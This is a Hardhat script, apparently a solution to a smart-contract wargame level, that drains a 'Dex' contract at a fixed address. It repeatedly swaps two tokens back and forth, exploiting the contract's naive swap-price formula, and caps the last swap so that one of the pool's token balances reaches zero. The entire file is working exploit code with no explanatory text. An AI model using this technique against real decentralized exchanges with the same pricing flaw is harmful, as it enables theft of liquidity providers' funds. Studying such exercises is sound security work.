import { BigNumber } from "ethers";
import { ethers } from "hardhat";
import * as helper from "./helpful_scripts";

async function main() {
    const [account] = await ethers.getSigners();
    const dex = await helper.getContractAt("Dex", "0xcB84d6ADE19158CB90479667614F2757641eAc8F");
    const token1 = await helper.getContractAt("SwappableToken", await dex.token1());
    const token2 = await helper.getContractAt("SwappableToken", await dex.token2());

    await helper.waitForTx(dex.approve(dex.address, 10000));
    await helper.waitForTx(dex.add_liquidity(token2.address, token2.balanceOf(account.address)));

    let count = 0;
    while (BigNumber.from(await dex.balanceOf(token1.address, dex.address)).gt(BigNumber.from('0')) && BigNumber.from(await dex.balanceOf(token2.address, dex.address)).gt(BigNumber.from('0'))) {
        if (count % 2 == 0) {
            let swapPrice = BigNumber.from(await dex.get_swap_price(token1.address, token2.address, await dex.balanceOf(token1.address, account.address)));
            let dexBalance = BigNumber.from(await dex.balanceOf(token2.address, dex.address));
            if (swapPrice.gt(dexBalance)) {
                console.log('1');
                await helper.waitForTx(dex.swap(token1.address, token2.address, await dex.balanceOf(token1.address, dex.address), {
                    gasLimit: 1000000
                }));

            } else {
                console.log('3');
                await helper.waitForTx(dex.swap(token1.address, token2.address, token1.balanceOf(account.address), {
                    gasLimit: 10000000
                }));
            }
        } else {
            let swapPrice = BigNumber.from(await dex.get_swap_price(token2.address, token1.address, await dex.balanceOf(token2.address, account.address)));
            let dexBalance = BigNumber.from(await dex.balanceOf(token1.address, dex.address));
            if (swapPrice.gt(dexBalance)) {
                console.log('2');
                await helper.waitForTx(dex.swap(token2.address, token1.address, await dex.balanceOf(token2.address, dex.address), {
                    gasLimit: 1000000
                }));

            } else {
                console.log('4');
                await helper.waitForTx(dex.swap(token2.address, token1.address, await token2.balanceOf(account.address), {
                    gasLimit: 10000000
                }));
            }
        }
        count++;
        console.log(await dex.balanceOf(token1.address, dex.address));
        console.log(await dex.balanceOf(token2.address, dex.address));
    };


}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });